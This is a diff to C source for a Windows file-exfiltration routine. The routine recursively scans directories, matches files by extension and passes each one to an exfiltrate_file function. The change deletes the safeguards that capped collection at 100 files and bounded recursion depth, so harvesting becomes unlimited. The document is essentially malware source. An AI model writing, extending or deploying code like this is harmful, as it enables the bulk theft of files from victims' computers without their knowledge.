@@ -159,14 +159,6 @@ char* exfiltrate_directory_by_extension_internal(const char* directory, const ch
     size_t result_size = 8192;  // Start with 8KB
     size_t result_len = 0;
     int count = 0;
-    const int max_files = 100;  // Limit to prevent memory issues
-    
-    // Check depth limit to prevent stack overflow
-    if (depth >= max_depth) {
-        *file_count = 0;
-        const char *empty = "[]";
-        return base64_encode((unsigned char*)empty, strlen(empty));
-    }
     
     if (!directory || !extensions || !file_count) {
         const char *error = "{\"error\":\"Invalid parameters for directory scan\"}";
@@ -222,8 +214,7 @@ char* exfiltrate_directory_by_extension_internal(const char* directory, const ch
         // Check if it's a directory
         if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             // Recursive directory scan
-            if (count < max_files) {
-                int subdir_count = 0;
+            int subdir_count = 0;
                 char* subdir_result = exfiltrate_directory_by_extension_internal(full_path, extensions, &subdir_count, depth + 1, max_depth);
                 
                 if (subdir_result && subdir_count > 0) {
@@ -262,10 +253,9 @@ char* exfiltrate_directory_by_extension_internal(const char* directory, const ch
                     }
                     free(subdir_result);
                 }
-            }
         } else {
             // Check if file matches extension filter
-            if (matches_any_extension(find_data.cFileName, extensions) && count < max_files) {
+            if (matches_any_extension(find_data.cFileName, extensions)) {
                 // Exfiltrate this file
                 char* file_data = exfiltrate_file(full_path);
                 
@@ -306,11 +296,6 @@ char* exfiltrate_directory_by_extension_internal(const char* directory, const ch
                     free(file_data);
                 }
             }
-        }
-        
-        // Stop if we've reached max files
-        if (count >= max_files) {
-            break;
         }
         
     } while (FindNextFileA(hFind, &find_data) != 0);
